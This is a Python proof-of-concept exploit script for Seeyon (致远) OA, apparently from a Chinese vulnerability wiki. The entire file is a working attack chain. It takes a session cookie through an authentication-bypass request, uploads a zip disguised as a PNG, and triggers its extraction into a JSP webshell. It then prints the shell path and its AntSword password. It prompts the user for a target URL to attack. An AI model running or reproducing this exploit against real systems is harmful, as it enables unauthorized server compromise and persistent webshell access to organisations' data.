# coding: utf-8
import requests
import sys
import random
import time
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 致远OA                                                   \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/thirdpartyController.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
            cookies = response.cookies
            cookies = requests.utils.dict_from_cookiejar(cookies)
            cookie = cookies['JSESSIONID']
            targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload'
            print("\033[32m[o] 目标 {} 正在上传压缩包文件.... \n[o] Cookie: {} \033[0m".format(target_url, cookie))
            files = [('file1', ('360icon.png', open('shell.zip', 'rb'), 'image/png'))]
            headers = {'Cookie':"JSESSIONID=%s" % cookie}
            data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0','isEncrypt': "0"}
            response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False)
            reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
            if len(reg)==0:
                sys.exit("上传文件失败")
            POC_2(target_url, cookie, reg, headers)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url),e)

def POC_2(target_url, cookie, reg, headers):
    vuln_url = target_url + '/seeyon/ajax.do'
    datestr = time.strftime('%Y-%m-%d')
    post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D'

    headers['Content-Type']="application/x-www-form-urlencoded"
    print("\033[32m[o] 目标 {} 正在解压文件.... \033[0m".format(target_url))
    try:
        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
        if response.status_code == 500:
            print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(target_url))
            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/test10086.jsp \033[0m".format(target_url))
            print("\033[32m[o] 蚁剑密码: test \033[0m".format(target_url))
            print("\033[32m[o] 如果目标webshell无法访问，请更换 shell.zip 中的木马名称 \033[0m".format(target_url))
        else:
                print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url),e)
        
        
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)